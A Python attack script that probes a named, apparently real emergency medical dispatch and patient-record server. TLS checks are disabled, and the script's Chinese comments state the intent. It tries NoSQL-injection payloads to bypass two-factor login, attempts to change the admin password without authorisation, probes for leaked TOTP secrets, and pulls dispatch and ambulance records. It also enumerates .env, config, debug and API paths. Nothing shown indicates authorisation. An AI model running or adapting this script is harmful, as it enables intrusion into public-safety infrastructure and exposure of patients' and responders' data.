#!/usr/bin/env python3
"""Probe newly discovered 4004 endpoints - 2FA/OTP/Users/Dispatch/Branches/config."""
import ssl
import json
import urllib.request
import urllib.error

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

BASE = "https://epcr.tpf.gov.tw:4004"

def probe(method, path, body=None, headers=None):
    url = BASE + path
    data = None
    h = {"User-Agent": "Mozilla/5.0"}
    if body is not None:
        data = json.dumps(body).encode("utf-8")
        h["Content-Type"] = "application/json"
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
            body_bytes = resp.read()
            print(f"[{resp.status}] {method:6s} {path}")
            print(f"  headers: {dict(resp.headers)}")
            try:
                print(f"  body: {body_bytes.decode('utf-8', 'replace')[:500]}")
            except Exception:
                print(f"  body: {body_bytes[:200]!r}")
            return resp.status, body_bytes
    except urllib.error.HTTPError as e:
        body_bytes = e.read()
        print(f"[{e.code}] {method:6s} {path}")
        try:
            print(f"  body: {body_bytes.decode('utf-8', 'replace')[:500]}")
        except Exception:
            print(f"  body: {body_bytes[:200]!r}")
        return e.code, body_bytes
    except Exception as e:
        print(f"[ERR] {method:6s} {path}  {type(e).__name__}: {e}")
        return None, None

# 1. TOTP/OTP - 最高优先级
print("=" * 80)
print("1. GET /tfa/requestOtp  (TOTP secret 泄露测试)")
print("=" * 80)
probe("GET", "/tfa/requestOtp")

# 2. TOTP 注册
print("\n" + "=" * 80)
print("2. POST /tfa/register  (无 userToken / 测试 userToken)")
print("=" * 80)
probe("POST", "/tfa/register", {"userToken": "test"})
probe("POST", "/tfa/register", {"userToken": ""})
probe("POST", "/tfa/register", {})

# 3. 2FA 登录（关键 - userToken 接受测试）
print("\n" + "=" * 80)
print("3. POST /login2FA  (userToken 接受测试)")
print("=" * 80)
probe("POST", "/login2FA", {"userToken": "test", "domain": "AUTH_SERVER"})
probe("POST", "/login2FA", {"userToken": "admin", "domain": "AUTH_SERVER"})
probe("POST", "/login2FA", {"userToken": {"$ne": None}, "domain": "AUTH_SERVER"})
probe("POST", "/login2FA", {"userToken": {"$gt": ""}, "domain": "AUTH_SERVER"})
probe("POST", "/login2FA", {"userToken": ["admin", "user", "root"], "domain": "AUTH_SERVER"})
probe("POST", "/login2FA", {})

# 4. 密码修改
print("\n" + "=" * 80)
print("4. PUT /Users/changePassword  (account 字段越权测试)")
print("=" * 80)
probe("PUT", "/Users/changePassword", {"account": "admin", "oldPassword": "x", "newPassword": "y", "newPasswordConfirmation": "y"})
probe("PUT", "/Users/changePassword", {"account": {"$ne": None}, "oldPassword": "x", "newPassword": "y", "newPasswordConfirmation": "y"})

# 5. DispatchRecords / Branches - jqlike NoSQL
print("\n" + "=" * 80)
print("5. GET /DispatchRecords  (jqlike NoSQL)")
print("=" * 80)
probe("GET", "/DispatchRecords")
probe("GET", "/DispatchRecords?dispatchedAT[$gte]=2020-01-01&StatusId[$notIn]=9,11,12")

print("\n" + "=" * 80)
print("6. GET /Branches/listBranchWithCaseRecordAndAmbulance")
print("=" * 80)
probe("GET", "/Branches/listBranchWithCaseRecordAndAmbulance")

# 7. /config 内部拓扑
print("\n" + "=" * 80)
print("7. GET /config  (内部拓扑)")
print("=" * 80)
probe("GET", "/config")
probe("GET", "/config.js")
probe("GET", "/js/config.js")
probe("GET", "/api/config")

# 8. 业务端点探测 - 救援派遣
print("\n" + "=" * 80)
print("8. 业务端点矩阵探测")
print("=" * 80)
for p in [
    "/Users", "/Roles", "/Permissions", "/Branches", "/DispatchRecords",
    "/EPCRCaseRecords", "/Hospitals", "/Activities",
    "/api/Users", "/api/Roles", "/api/Permissions",
    "/api/v1/Users", "/api/v2/Users",
    "/swagger", "/api-docs", "/api/v1/health",
    "/version", "/health", "/healthz", "/api/health",
    "/_debug", "/debug", "/.env", "/env",
    "/api/login", "/oauth/token", "/api/v1/auth/login",
    "/api/activityRecords", "/api/logout", "/Activities/logoutRecord",
    "/api/v1/Activities/logoutRecord",
]:
    probe("GET", p)
